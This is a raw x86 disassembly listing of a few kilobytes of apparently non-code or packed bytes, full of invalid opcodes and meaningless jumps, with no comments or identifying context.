  4038c1:	add    BYTE PTR [ebp+0x20398847],bh
  4038c7:	out    dx,eax
  4038c8:	dec    edi
  4038c9:	mov    al,0x8e
  4038cb:	push   ecx
  4038cc:	aam    0x52
  4038ce:	jae    0x403906
  4038d0:	jmp    0x40387f
  4038d2:	hlt    
  4038d3:	ss dec ebp
  4038d5:	(bad)  [edi-0x7cb1f098]
  4038db:	xchg   esi,eax
  4038dc:	popf   
  4038dd:	push   edi
  4038de:	cmp    esp,DWORD PTR [ebp-0x2dacd6b7]
  4038e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038e5:	mov    edi,esp
  4038e7:	fnsave [eax+0x23]
  4038ea:	xchg   esi,eax
  4038eb:	mov    ecx,0x9363c8a4
  4038f0:	pop    ecx
  4038f1:	cmp    eax,0x1f303d04
  4038f6:	fld    TBYTE PTR [edx-0x3a9c63b3]
  4038fc:	shl    BYTE PTR [eax-0x4],cl
  4038ff:	sub    DWORD PTR [ebx],0x75
  403902:	mov    ebp,0xb636808d
  403907:	inc    ecx
  403908:	jo     0x403910
  40390a:	ins    BYTE PTR es:[edi],dx
  40390b:	xchg   ebp,eax
  40390c:	outs   dx,DWORD PTR ds:[esi]
  40390d:	push   edi
  40390e:	sti    
  40390f:	ins    DWORD PTR es:[edi],dx
  403910:	fwait
  403911:	mov    dh,0x3e
  403913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403914:	repnz or dl,bh
  403917:	rcl    BYTE PTR [edi+0x549f6afa],cl
  40391d:	fmulp  st(7),st
  40391f:	pop    ebx
  403920:	sbb    BYTE PTR [edi+0x58],bh
  403923:	cmp    eax,0xa0add9f1
  403928:	retf   
  403929:	in     al,dx
  40392a:	call   0x2a1e2483
  40392f:	scas   eax,DWORD PTR es:[edi]
  403930:	scas   al,BYTE PTR es:[edi]
  403931:	scas   eax,DWORD PTR es:[edi]
  403932:	retf   0x2fa6
  403935:	dec    ebp
  403936:	push   esi
  403937:	ret    
  403938:	int    0x38
  40393a:	pop    ss
  40393b:	int    0x4b
  40393d:	jns    0x403944
  40393f:	and    BYTE PTR [eax],al
  403941:	push   eax
  403942:	adc    esi,0xffffff94
  403945:	hlt    
  403946:	cmp    eax,0x112b90cc
  40394b:	jl     0x10952ae7
  403951:	push   edx
  403952:	cmp    ch,0x49
  403955:	hlt    
  403956:	mov    dl,0x5f
  403958:	adc    DWORD PTR [edi],ebp
  40395a:	mov    ah,0xa6
  40395c:	bound  eax,QWORD PTR [edx+0x2178fc98]
  403962:	scas   al,BYTE PTR es:[edi]
  403963:	mov    gs,WORD PTR [edx+0x38]
  403966:	pop    ecx
  403967:	add    DWORD PTR [eax-0x67],esi
  40396a:	inc    ecx
  40396b:	dec    edi
  40396c:	inc    ebp
  40396d:	cmp    DWORD PTR [ecx+edi*1-0x2221957],ecx
  403974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403975:	jge    0x403984
  403977:	outs   dx,BYTE PTR ds:[esi]
  403978:	leave  
  403979:	pop    es
  40397a:	out    0x84,eax
  40397c:	outs   dx,DWORD PTR ds:[esi]
  40397d:	jbe    0x4039da
  40397f:	sub    al,0x8b
  403981:	adc    ch,ah
  403983:	jecxz  0x4039dc
  403985:	(bad)  
  403987:	jb     0x4039fa
  403989:	outs   dx,DWORD PTR ds:[esi]
  40398a:	cmp    al,0x2
  40398d:	sbb    BYTE PTR [ebx],ah
  40398f:	mov    bl,0x55
  403991:	dec    ebx
  403992:	push   ebp
  403993:	sbb    eax,0x68d50557
  403998:	sahf   
  403999:	(bad)  
  40399a:	xchg   esp,eax
  40399b:	fcom   QWORD PTR [edx+0x69f0d79a]
  4039a1:	ficomp WORD PTR [eax]
  4039a3:	fnstcw WORD PTR [esp+esi*8]
  4039a6:	jnp    0x40395b
  4039a8:	push   ebx
  4039a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039aa:	in     al,dx
  4039ab:	xchg   ecx,eax
  4039ac:	cmp    dl,BYTE PTR [eax]
  4039ae:	mov    esi,0x7f032df1
  4039b3:	stos   DWORD PTR es:[edi],eax
  4039b4:	mov    bh,0x5a
  4039b6:	mov    ds:0x759ee2c4,eax
  4039bb:	(bad)  
  4039bc:	jg     0x403a3c
  4039be:	call   0xd8928d4c
  4039c3:	pop    ss
  4039c4:	jp     0x403a2b
  4039c6:	or     ebp,ebx
  4039c8:	cwde   
  4039c9:	add    ebx,eax
  4039cb:	stos   BYTE PTR es:[edi],al
  4039cc:	jp     0x40397a
  4039ce:	inc    esi
  4039cf:	mov    eax,ds:0x4a45e652
  4039d4:	dec    edx
  4039d5:	scas   al,BYTE PTR es:[edi]
  4039d6:	mov    bh,0x3a
  4039d8:	jne    0x403a28
  4039da:	sbb    ebx,eax
  4039dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039dd:	shl    edi,0x16
  4039e0:	clc    
  4039e1:	stos   BYTE PTR es:[edi],al
  4039e2:	loope  0x403a3a
  4039e4:	(bad)  
  4039e6:	add    eax,0x80e72e40
  4039eb:	or     eax,0x3cf1719d
  4039f0:	nop
  4039f1:	lds    edx,FWORD PTR [edi+eiz*8]
  4039f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039f5:	jne    0x4039dd
  4039f7:	pushf  
  4039f8:	mov    esi,0xda36e675
  4039fd:	out    dx,eax
  4039fe:	push   esi
  4039ff:	xchg   ebp,eax
  403a00:	in     eax,0x45
  403a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a03:	nop
  403a04:	jbe    0x403a1a
  403a06:	xchg   esp,eax
  403a07:	mov    ds:0x173e2dfb,eax
  403a0c:	add    eax,0x26f8329
  403a11:	sbb    DWORD PTR ds:0xd8cdc09d,0xafe6b3c4
  403a1b:	pop    esp
  403a1c:	imul   DWORD PTR [ebx]
  403a1e:	iret   
  403a1f:	add    eax,0xe41bffa
  403a24:	cmp    BYTE PTR [ecx-0x5d910a34],al
  403a2a:	test   eax,0xe01e19b1
  403a2f:	jmp    0x4039f1
  403a31:	or     ch,dh
  403a33:	jae    0x403a21
  403a35:	xchg   edi,eax
  403a36:	loopne 0x403a32
  403a38:	pop    esp
  403a39:	sbb    BYTE PTR [ebx-0x7034b91b],bh
  403a3f:	adc    al,0xf3
  403a41:	jp     0x403a19
  403a43:	push   0xd73b38fb
  403a48:	loope  0x403a47
  403a4a:	pop    ebp
  403a4b:	test   DWORD PTR ds:0x620ed8b8,ecx
  403a51:	dec    ebp
  403a52:	push   ss
  403a53:	frstor [edx+0x263d478]
  403a59:	aaa    
  403a5a:	sub    esp,ecx
  403a5c:	pop    esi
  403a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a5e:	and    BYTE PTR [eax+0x773a6fb9],0xc5
  403a65:	sub    BYTE PTR [esi+0x36258eb9],0x13
  403a6c:	dec    edi
  403a6d:	(bad)  
  403a6e:	je     0x403ac3
  403a70:	aaa    
  403a71:	and    eax,DWORD PTR [ebx-0xf]
  403a74:	jbe    0x403aae
  403a76:	adc    eax,0xb421f835
  403a7b:	ret    0xae99
  403a7e:	or     ah,bl
  403a80:	jo     0x403a50
  403a82:	xchg   BYTE PTR [ebp-0x4fa3c606],dl
  403a88:	pop    ds
  403a89:	and    eax,DWORD PTR [edx-0x629f08be]
  403a8f:	jb     0x403a52
  403a91:	add    DWORD PTR [ebx+0xb],eax
  403a94:	seto   BYTE PTR [ebx+0x18]
  403a98:	fmul   st,st(6)
  403a9a:	xor    al,dl
  403a9c:	xor    bl,bh
  403a9e:	data16 jg 0x403ab7
  403aa1:	mov    al,BYTE PTR [ebx+0xca326c6]
  403aa7:	and    DWORD PTR [esi+0x564824ed],ebx
  403aad:	add    bl,BYTE PTR [ebx+eiz*2]
  403ab0:	clc    
  403ab1:	dec    esi
  403ab2:	dec    ebp
  403ab3:	xor    bh,BYTE PTR [ecx+eiz*8-0x32]
  403ab7:	and    ch,BYTE PTR [edi+0x2b5b7337]
  403abd:	pop    esp
  403abe:	ins    DWORD PTR es:[edi],dx
  403abf:	icebp  
  403ac0:	xchg   ebx,eax
  403ac1:	mov    ebx,0xca781324
  403ac6:	push   ebp
  403ac7:	imul   ebp,DWORD PTR [ecx-0x67],0x18e04c78
  403ace:	pushf  
  403acf:	inc    esi
  403ad0:	retf   0xb90c
  403ad3:	repz test ecx,0x13c821
  403ada:	sbb    al,0x84
  403adc:	fwait
  403add:	shr    BYTE PTR cs:0x53629727,cl
  403ae4:	sbb    al,0xd5
  403ae6:	mov    dl,0x8e
  403ae8:	repnz aam 0xc2
  403aeb:	fstp   DWORD PTR [edx-0x4a]
  403aee:	jnp    0x403b5a
  403af0:	cmp    DWORD PTR [esi+0x19],eax
  403af3:	test   al,0x23
  403af5:	dec    edi
  403af6:	cmp    BYTE PTR [ebp-0x6c5c6eb0],dl
  403afc:	mov    WORD PTR [ebp-0x2b68b3b3],cs
  403b02:	ja     0x403b16
  403b04:	scas   eax,DWORD PTR es:[edi]
  403b05:	stos   BYTE PTR es:[edi],al
  403b06:	loope  0x403b3c
  403b08:	cmp    eax,0x44b07a20
  403b0d:	or     BYTE PTR [ebx-0x43c4c154],al
  403b13:	mov    ebp,ds
  403b15:	push   ss
  403b16:	dec    ebp
  403b17:	cmp    dl,BYTE PTR [edx+0x7a27ea75]
  403b1d:	mov    edx,0x314390bc
  403b22:	fcmove st,st(3)
  403b24:	pop    es
  403b25:	jg     0x403afb
  403b27:	push   ebp
  403b28:	(bad)  
  403b2a:	pusha  
  403b2b:	sti    
  403b2c:	hlt    
  403b2d:	es mov ebp,0x6b6bdd3
  403b33:	stc    
  403b34:	xor    ecx,DWORD PTR [ebx]
  403b36:	add    eax,0x42d37336
  403b3b:	mov    cs,eax
  403b3d:	mov    dh,0x1e
  403b3f:	bound  eax,QWORD PTR [edi+0x10bb7bef]
  403b45:	(bad)  
  403b46:	fcmove st,st(2)
  403b48:	out    0x8d,eax
  403b4a:	ret    0x66a2
  403b4d:	and    al,0x24
  403b4f:	sub    DWORD PTR [esi-0x53],eax
  403b52:	call   DWORD PTR [bx+di-0x1514]
  403b57:	pop    esi
  403b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b59:	(bad)  
  403b5a:	cmc    
  403b5b:	in     eax,dx
  403b5c:	loop   0x403b77
  403b5e:	cwde   
  403b5f:	shl    DWORD PTR [eax+0x192f5e1f],0x69
  403b66:	cmp    ecx,DWORD PTR [eax]
  403b68:	rcl    DWORD PTR [edx+0x3c],cl
  403b6b:	sub    al,0xef
  403b6d:	jmp    0xe405:0x8e500526
  403b74:	add    eax,0xdff99411
  403b79:	div    DWORD PTR [esi-0x138a232b]
  403b7f:	inc    ebx
  403b80:	dec    ebx
  403b81:	mov    edi,0xa6b18a02
  403b86:	sbb    BYTE PTR [ebx+0x74b9f44e],0x67
  403b8d:	aas    
  403b8e:	mov    al,0x73
  403b91:	out    dx,eax
  403b92:	nop
  403b93:	and    eax,ebx
  403b95:	xor    dl,0x51
  403b98:	or     al,0xf2
  403b9a:	dec    edx
  403b9b:	mov    bh,0x34
  403b9d:	inc    ecx
  403b9e:	stos   DWORD PTR es:[edi],eax
  403b9f:	lods   eax,DWORD PTR ds:[esi]
  403ba0:	or     edx,DWORD PTR [edx+0x26]
  403ba3:	cmc    
  403ba4:	cmp    DWORD PTR [ebx+eax*8-0x7d5e1c2f],ecx
  403bab:	cmp    al,0x2d
  403bad:	sbb    BYTE PTR [esp+esi*2],dl
  403bb0:	inc    esi
  403bb1:	into   
  403bb2:	retf   0x92f6
  403bb5:	cdq    
  403bb6:	xchg   esi,eax
  403bb7:	mov    edx,DWORD PTR [edi]
  403bb9:	dec    ebp
  403bba:	or     dh,cl
  403bbc:	add    al,0x13
  403bbe:	test   al,0x27
  403bc0:	rcr    DWORD PTR [ebx],1
  403bc2:	call   0x5cd8:0x26427a39
  403bc9:	mov    dh,0xb0
  403bcb:	scas   al,BYTE PTR es:[edi]
  403bcc:	aaa    
  403bcd:	addr16 inc ebp
  403bcf:	jns    0x403b52
  403bd1:	aaa    
  403bd2:	adc    ebx,DWORD PTR ds:0x18fc25b0
  403bd8:	mov    ss,esi
  403bda:	paddsb mm1,QWORD PTR [ebx+0x5d48e6de]
  403be1:	adc    BYTE PTR [eax],ah
  403be3:	cli    
  403be4:	call   0x9a853aa7
  403be9:	sub    BYTE PTR [edi+0x7ea0b263],dh
  403bef:	jb     0x403c52
  403bf1:	or     ebp,edx
  403bf3:	call   0x2f2a4d05
  403bf8:	mov    esi,0xc474e2a4
  403bfd:	mov    esi,esp
  403bff:	icebp  
  403c00:	ret    0x5892
  403c03:	dec    edi
  403c04:	gs jg  0x403bc8
  403c07:	cmp    DWORD PTR [edi+eiz*1-0x575aac84],ebp
  403c0e:	aam    0x4b
  403c10:	sti    
  403c11:	sbb    eax,0x41fe1ee2
  403c16:	daa    
  403c17:	pop    ecx
  403c18:	popa   
  403c19:	fadd   DWORD PTR ds:0x5bd344df
  403c1f:	xchg   esp,eax
  403c20:	xchg   ebx,eax
  403c21:	mov    ecx,0x8774e8e0
  403c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c27:	or     BYTE PTR [edi+0x19babcb9],cl
  403c2d:	gs pop esp
  403c2f:	(bad)  
  403c30:	dec    esp
  403c31:	repz or dl,BYTE PTR [ebx]
  403c34:	add    al,0xcb
  403c36:	dec    ebp
  403c37:	neg    DWORD PTR [ecx+edi*4]
  403c3a:	fld    QWORD PTR [edi+eiz*8]
  403c3d:	sub    eax,0x25832591
  403c42:	xchg   dh,ah
  403c44:	sbb    edx,DWORD PTR [edi]
  403c46:	jge    0x403bdf
  403c48:	xchg   esi,eax
  403c49:	in     eax,dx
  403c4a:	xchg   esi,eax
  403c4b:	sahf   
  403c4c:	lahf   
  403c4d:	mov    ah,0xfb
  403c4f:	push   ecx
  403c50:	(bad)  
  403c51:	loopne 0x403ca3
  403c53:	pop    ebp
  403c54:	xchg   esp,eax
  403c55:	or     ah,bl
  403c57:	dec    eax
  403c58:	jp     0x403c85
  403c5a:	mov    ebp,0x6e74a473
  403c5f:	lods   al,BYTE PTR ds:[esi]
  403c60:	sub    dh,dl
  403c62:	dec    edi
  403c63:	cld    
  403c64:	inc    ebp
  403c66:	inc    edx
  403c67:	dec    ecx
  403c68:	pop    ecx
  403c69:	mov    gs,WORD PTR es:[eax]
  403c6c:	stos   DWORD PTR es:[edi],eax
  403c6d:	push   eax
  403c6e:	ins    BYTE PTR es:[edi],dx
  403c6f:	stos   DWORD PTR es:[edi],eax
  403c70:	int3   
  403c71:	jnp    0x403c5f
  403c73:	xchg   ebp,eax
  403c74:	jnp    0x403c9f
  403c76:	hlt    
  403c77:	add    ah,BYTE PTR [edi-0x2e133cdf]
  403c7d:	xchg   edx,eax
  403c7e:	or     ebp,DWORD PTR [edi+0x4a483c7e]
  403c84:	iret   
  403c85:	push   ecx
  403c86:	pop    ebx
  403c87:	push   0x9f1786d
  403c8c:	iret   
  403c8d:	sub    eax,0xd594fd6d
  403c92:	dec    edx
  403c93:	ret    0xbafc
  403c96:	ror    ebp,0x77
  403c99:	ins    DWORD PTR es:[edi],dx
  403c9a:	inc    edx
  403c9b:	cwde   
  403c9c:	dec    ebp
  403c9d:	lahf   
  403c9e:	push   ebp
  403c9f:	fild   DWORD PTR ds:0xf2ef7502
  403ca5:	ss nop
  403ca7:	ds jle 0x403ce3
  403caa:	imul   esp,DWORD PTR [edi-0x115a648],0xaca8323b
  403cb4:	sbb    eax,DWORD PTR [ebp-0x54e0e3d6]
  403cba:	nop
  403cbb:	jg     0x403cdf
  403cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cbe:	inc    ebx
  403cbf:	popa   
  403cc0:	ror    BYTE PTR [edx+0x6f425eb9],1
  403cc6:	in     eax,dx
  403cc7:	sbb    edi,ebp
  403cc9:	add    eax,0xb9e85430
  403cce:	fisub  WORD PTR [ebx]
  403cd0:	dec    edx
  403cd1:	loop   0x403ce2
  403cd3:	xor    DWORD PTR [edi+0x1],edx
  403cd6:	aas    
  403cd7:	jl     0x403d1b
  403cd9:	pop    ecx
  403cda:	fidiv  WORD PTR [ebx+0x64]
  403cdd:	fimul  DWORD PTR [ebx+0x61bde626]
  403ce3:	adc    DWORD PTR [eax],0xe447edce
  403ce9:	fdivr  QWORD PTR [edi+0x47cd004]
  403cef:	xlat   BYTE PTR ds:[ebx]
  403cf0:	ficom  WORD PTR [ecx+0x222148c9]
  403cf6:	or     al,0xf1
  403cf8:	inc    eax
  403cf9:	jnp    0x403cfa
  403cfb:	shl    edx,1
  403cfd:	inc    eax
  403cfe:	adc    al,0x3e
  403d00:	js     0x403d32
  403d02:	fldenv [edx+0x42]
  403d05:	ds jecxz 0x403cd2
  403d08:	push   esp
  403d09:	xchg   BYTE PTR gs:[edx+0x6281daca],bl
  403d10:	jo     0x403cb1
  403d12:	aam    0x74
  403d14:	and    DWORD PTR [ebp+0x30597638],0xffffffd6
  403d1b:	and    ecx,DWORD PTR [edi]
  403d1d:	lea    esp,[esp+eiz*2]
  403d20:	adc    eax,0xa74553a1
  403d25:	xchg   ebp,eax
  403d26:	xor    eax,eax
  403d28:	jo     0x403ce5
  403d2a:	loopne 0x403d41
  403d2c:	xor    bl,BYTE PTR [eax]
  403d2e:	(bad)  
  403d2f:	mov    esp,0xcd6a715d
  403d34:	ja     0x403d25
  403d36:	lock adc BYTE PTR [edx+0x435ea57d],cl
  403d3d:	adc    al,BYTE PTR ds:0x524befa4
  403d43:	adc    BYTE PTR [ecx-0x23822e21],bh
  403d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4a:	ja     0x403cd8
  403d4c:	fistp  DWORD PTR [ecx-0x6b]
  403d4f:	xchg   edx,eax
  403d50:	mov    eax,ds:0xb68c2f40
  403d55:	mov    bl,0x8a
  403d57:	hlt    
  403d58:	idiv   dl
  403d5a:	pusha  
  403d5b:	repz or DWORD PTR [edx+0x54ad2283],ecx
  403d62:	mov    esp,DWORD PTR [ebp+ebp*2-0x3c42771f]
  403d69:	lock cmp al,0x33
  403d6c:	dec    ebx
  403d6d:	sub    eax,0xea4791c1
  403d72:	xchg   edi,eax
  403d73:	inc    ebp
  403d74:	call   0x65b6:0x252cbf51
  403d7b:	aam    0x85
  403d7d:	or     BYTE PTR [esi+eiz*1-0x17],cl
  403d81:	or     BYTE PTR [ecx],0x18
  403d84:	dec    ecx
  403d85:	push   ds
  403d86:	push   esp
  403d87:	xor    eax,ebp
  403d89:	jmp    0x2cf48ce5
  403d8e:	xlat   BYTE PTR ds:[ebx]
  403d8f:	jne    0x403d1c
  403d91:	sub    DWORD PTR [esi],esi
  403d93:	push   ds
  403d94:	xor    eax,edx
  403d96:	add    bl,BYTE PTR [ebx+edx*1-0x38]
  403d9a:	(bad)  
  403d9b:	and    eax,0xfbdedcac
  403da0:	lds    esi,FWORD PTR [ecx]
  403da2:	mov    BYTE PTR [edi],ch
  403da4:	sbb    eax,0x4baf08a0
  403da9:	push   ecx
  403daa:	jmp    0xaeb7a962
  403daf:	mov    al,BYTE PTR [esi+eiz*1-0x11]
  403db3:	add    al,ch
  403db5:	sbb    ebp,0xffffffe3
  403db8:	xchg   ebp,eax
  403db9:	push   cs
  403dba:	jle    0x403dc0
  403dbc:	cmc    
  403dbd:	sbb    cl,BYTE PTR [edi+0x27]
  403dc0:	sar    BYTE PTR [ebx-0xa1df50f],cl
  403dc6:	push   cs
  403dc7:	loopne 0x403d7a
  403dc9:	(bad)
  403dcc:	ficom  WORD PTR [esi+0xd9447de]
  403dd2:	mov    esi,DWORD PTR [esp+ebp*4-0x76]
  403dd6:	outs   dx,DWORD PTR ds:[esi]
  403dd7:	shl    DWORD PTR [eax+0x24],0x8e
  403ddb:	jge    0x403e2e
  403ddd:	cs cld 
  403ddf:	push   cs
  403de0:	cwde   
  403de1:	repnz scas eax,DWORD PTR es:[edi]
  403de3:	push   ds
  403de4:	(bad)  
  403de5:	iret   
  403de6:	lods   eax,DWORD PTR ds:[esi]
  403de7:	sub    DWORD PTR [esi+eax*2-0x4d3f21e5],0x69
  403def:	inc    esp
  403df0:	mov    dh,0x4e
  403df2:	dec    esi
  403df3:	int3   
  403df4:	clc    
  403df5:	pop    esp
  403df6:	sahf   
  403df7:	cmp    DWORD PTR [ebx-0x10],esi
  403dfa:	imul   edx,esp,0x93d1214b
  403e00:	or     DWORD PTR [ebx],0xb40f23d8
  403e06:	fbld   TBYTE PTR [esi-0x5176e634]
  403e0c:	icebp  
  403e0d:	inc    ecx
  403e0e:	leave  
  403e0f:	pop    esp
  403e10:	leave  
  403e11:	inc    esp
  403e12:	pop    ecx
  403e13:	js     0x403dbc
  403e15:	arpl   WORD PTR [eax+0x61],dx
  403e18:	ss jnp 0x403e67
  403e1b:	(bad)  
  403e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e1d:	sbb    dh,BYTE PTR [edi]
  403e1f:	aaa    
  403e20:	jae    0x403de2
  403e22:	mov    ebp,0x3dfbf4ad
  403e27:	dec    esp
  403e28:	mov    esi,0x3065fdcc
  403e2d:	ror    BYTE PTR [edx],0x5c
  403e30:	xor    DWORD PTR [eax],esp
  403e32:	out    dx,al
  403e33:	jb     0x403e39
  403e35:	jne    0x403e99
  403e37:	inc    ebx
  403e38:	or     DWORD PTR [eax-0x54ff786a],esi
  403e3e:	in     al,0xba
  403e40:	test   al,0x26
  403e42:	and    al,0xdb
  403e44:	pop    ds
  403e45:	cmp    BYTE PTR [ebx-0x22],bh
  403e48:	sub    ch,BYTE PTR [eax+edx*2-0x1eb1bd9a]
  403e4f:	(bad)  
  403e50:	jmp    0x403e1d
  403e52:	repz ret 
  403e54:	dec    edi
  403e55:	jne    0x403e45
  403e57:	pop    ebp
  403e58:	fidiv  WORD PTR [ebx-0x53]
  403e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e5c:	stos   BYTE PTR es:[edi],al
  403e5d:	add    esp,esi
  403e5f:	and    eax,0xe2583569
  403e64:	ja     0x403ebb
  403e66:	adc    BYTE PTR [ebp-0x6],0xda
  403e6a:	and    DWORD PTR [ebp-0x205b27d1],edx
  403e70:	mov    dl,0x3b
  403e72:	(bad)  
  403e74:	pusha  
  403e75:	adc    al,0xf3
  403e77:	cdq    
  403e78:	or     dh,BYTE PTR [edx-0x20fe4a04]
  403e7e:	push   esi
  403e7f:	pop    eax
  403e80:	add    BYTE PTR [esi+ebp*4],al
  403e83:	sub    al,0xe7
  403e85:	(bad)  
  403e86:	ins    DWORD PTR es:[edi],dx
  403e87:	dec    esp
  403e88:	scas   eax,DWORD PTR es:[edi]
  403e89:	jae    0x403e98
  403e8b:	mov    ds:0x4f8a4a16,al
  403e90:	mov    fs:0xa1049dcc,al
  403e96:	push   edi
  403e97:	jo     0x403eef
  403e99:	fwait
  403e9a:	or     eax,DWORD PTR [ebp+0x46095004]
  403ea0:	lock leave 
  403ea2:	inc    esi
  403ea3:	or     DWORD PTR [ecx-0x161b5a81],eax
  403ea9:	jb     0x403ef1
  403eab:	push   edx
  403eac:	aam    0xe
  403eae:	inc    eax
  403eaf:	fidiv  DWORD PTR es:[edx+0x45]
  403eb3:	enter  0x3148,0x46
  403eb7:	(bad)  
  403eb8:	hlt    
  403eb9:	pop    ebx
  403eba:	mov    edi,0xdee2daaa
  403ebf:	(bad)  
  403ec1:	or     DWORD PTR [edi],0xffffffe9
  403ec4:	rcl    BYTE PTR [ebp+0x4440f52d],cl
  403eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ecb:	leave  
  403ecc:	das    
  403ecd:	test   al,0x78
  403ecf:	mov    dl,0x74
  403ed1:	fwait
  403ed2:	push   ax
  403ed4:	outs   dx,BYTE PTR ds:[esi]
  403ed5:	adc    BYTE PTR [edx+0x4e90b4a],ch
  403edb:	sub    al,0x9d
  403edd:	mov    al,ds:0x159dba3a
  403ee2:	aaa    
  403ee3:	mov    DWORD PTR [ecx],edi
  403ee5:	jecxz  0x403f39
  403ee7:	stos   BYTE PTR es:[edi],al
  403ee8:	jecxz  0x403ee2
  403eea:	dec    edi
  403eeb:	adc    cl,cl
  403eed:	dec    edi
  403eee:	xor    DWORD PTR [edi],ebp
  403ef0:	mov    al,ds:0x7838d458
  403ef5:	daa    
  403ef6:	jb     0x403f4e
  403ef8:	je     0x403e99
  403efa:	cmp    DWORD PTR [edi+edi*1],edi
  403efd:	and    ebx,DWORD PTR [edx+0x5e]
  403f00:	pop    ecx
  403f01:	xchg   edi,eax
  403f02:	pop    esp
  403f03:	test   BYTE PTR [ebp+0x14],dl
  403f06:	xchg   DWORD PTR [eax-0x45b222b6],ecx
  403f0c:	push   eax
  403f0d:	xlat   BYTE PTR ds:[ebx]
  403f0e:	xchg   esi,eax
  403f0f:	in     eax,0x3b
  403f11:	jnp    0x403ec0
  403f13:	(bad)  
  403f14:	leave  
  403f15:	mov    eax,ds:0x6ecf86bf
  403f1a:	mov    edx,0x2a46edf9
  403f1f:	inc    edi
  403f20:	xchg   DWORD PTR [ebx+ebx*4+0x5e970ab7],ebp
  403f27:	and    esi,esp
  403f29:	mov    eax,ds:0xb1b83039
  403f2e:	in     al,0xe4
  403f30:	push   esi
  403f31:	jle    0x403f99
  403f33:	add    eax,0x5008a40d
  403f38:	xor    ebx,DWORD PTR [eax+edi*2]
  403f3b:	repnz mov edi,0x53e44bf4
  403f41:	jb     0x403ef7
  403f43:	out    0x3d,al
  403f45:	rcl    BYTE PTR [eax+eax*4+0x6],cl
  403f49:	mov    ebp,0x8e7aea48
  403f4e:	imul   ebx,DWORD PTR [edx+0x19],0xffffffe3
  403f52:	out    0xc8,eax
  403f54:	mov    ch,0x85
  403f56:	xor    dl,BYTE PTR [esi-0xada66dc]
  403f5c:	mov    ebx,0x648ad7a7
  403f61:	xor    eax,0xeb34482e
  403f66:	pusha  
  403f67:	jecxz  0x403fb6
  403f69:	outs   dx,BYTE PTR ds:[esi]
  403f6a:	pop    edx
  403f6b:	inc    ebp
  403f6c:	jb     0x403fe6
  403f6e:	ss rcr eax,1
  403f71:	clc    
  403f72:	jno    0x403f0a
  403f74:	and    ah,BYTE PTR [ebx]
  403f76:	jae    0x403fa6
  403f78:	not    BYTE PTR [ebx-0x72ab0442]
  403f7e:	data16 cmp dl,dl
  403f81:	add    DWORD PTR [ebp-0x2b],ecx
  403f84:	aam    0x19
  403f86:	cli    
  403f87:	adc    DWORD PTR [esi],0x3c
  403f8a:	mov    ebx,ebx
  403f8c:	mov    esi,DWORD PTR [esi+0x41]
  403f8f:	fdiv   QWORD PTR [ebx]
  403f91:	in     al,dx
  403f92:	inc    ecx
  403f93:	call   0xdcb433ad
  403f98:	outs   dx,DWORD PTR ds:[esi]
  403f99:	ficomp WORD PTR [ebp-0x26]
  403f9c:	jno    0x403fe8
  403f9e:	mov    eax,ds:0x39106857
  403fa3:	dec    eax
  403fa4:	or     DWORD PTR [edi],0xffffff95
  403fa7:	int3   
  403fa8:	adc    ebx,DWORD PTR [esi-0x2]
  403fab:	stc    
  403fac:	sub    DWORD PTR [edx],eax
  403fae:	inc    ebx
  403faf:	xor    BYTE PTR [ebx-0x148336d5],0xb
  403fb6:	les    eax,FWORD PTR [esi+0x11]
  403fb9:	mov    ds:0x9c906cf8,eax
  403fbe:	adc    ah,BYTE PTR [eax+0x3acc1c00]
  403fc4:	gs dec ebx
  403fc6:	xchg   edi,eax
  403fc7:	cmp    eax,0xe3a4423e
  403fcc:	bound  ebx,QWORD PTR [eax-0x4c]
  403fcf:	cmp    eax,0xab5c7336
  403fd4:	int3   
  403fd5:	ret    0x96b9
  403fd8:	out    0x76,al
  403fda:	cs dec eax
  403fdc:	loopne 0x403ff0
  403fde:	mov    eax,ds:0xd3325369
  403fe3:	sbb    ax,0xf0e2
  403fe7:	gs dec edx
  403fe9:	(bad)  
  403fea:	jecxz  0x403f7a
  403fec:	inc    eax
  403fed:	and    DWORD PTR [ecx+0x3f],edx
  403ff0:	(bad)  
  403ff1:	cli    
  403ff2:	cld    
  403ff3:	add    esi,DWORD PTR cs:[ecx]
  403ff6:	leave  
  403ff7:	jp     0x403ff5
  403ff9:	ds call 0x3ac6fa62
  403fff:	out    dx,eax
  404000:	out    0x70,eax
  404002:	mov    dl,0xd4
  404004:	jmp    0x403fce
  404006:	mov    dl,BYTE PTR [eax]
  404008:	or     ecx,DWORD PTR [ecx-0x55dc6205]
  40400e:	mov    esi,0x97dcd304
  404013:	ror    DWORD PTR ds:0x8e5755f2,1
  404019:	mov    esi,0x93df3485
  40401e:	xor    eax,0x5071945c
  404023:	std    
  404024:	add    edi,eax
  404026:	lock pop ecx
  404028:	inc    esi
  404029:	adc    eax,0x4d3cc7b9
  40402e:	jb     0x404067
  404030:	dec    esp
  404031:	repnz xchg ecx,eax
  404033:	push   esi
  404034:	or     BYTE PTR [ecx+0x51],0xa9
  404038:	or     edx,edi
  40403a:	xchg   edx,eax
  40403b:	rcl    esi,1
  40403d:	and    DWORD PTR [esi],esi
  40403f:	stc    
  404040:	adc    DWORD PTR [ecx-0x5c],ebp
  404043:	mov    edx,0xae5380a2
  404048:	call   0x6a3b:0x42309b57
  40404f:	sbb    ch,dh
  404051:	jmp    0x316:0x27ec544d
  404058:	jb     0x40400b
  40405a:	pop    ebx
  40405b:	mov    dh,0x1b
  40405d:	sar    DWORD PTR [eax-0x5b],1
  404060:	mov    gs,esp
  404062:	sahf   
  404063:	jnp    0x403feb
  404065:	push   ebp
  404066:	mulps  xmm0,XMMWORD PTR [ecx+0xbdd2623]
  40406d:	adc    esi,DWORD PTR [ebx]
